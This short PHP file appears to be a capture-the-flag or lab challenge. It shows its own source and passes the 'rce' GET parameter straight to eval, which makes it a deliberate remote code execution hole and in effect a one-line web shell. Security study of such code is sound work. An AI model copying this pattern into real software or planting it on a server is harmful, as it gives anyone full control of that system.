<?php

highlight_file(__FILE__);

if (isset($_GET['rce'])) {
    eval($_GET['rce']);
}
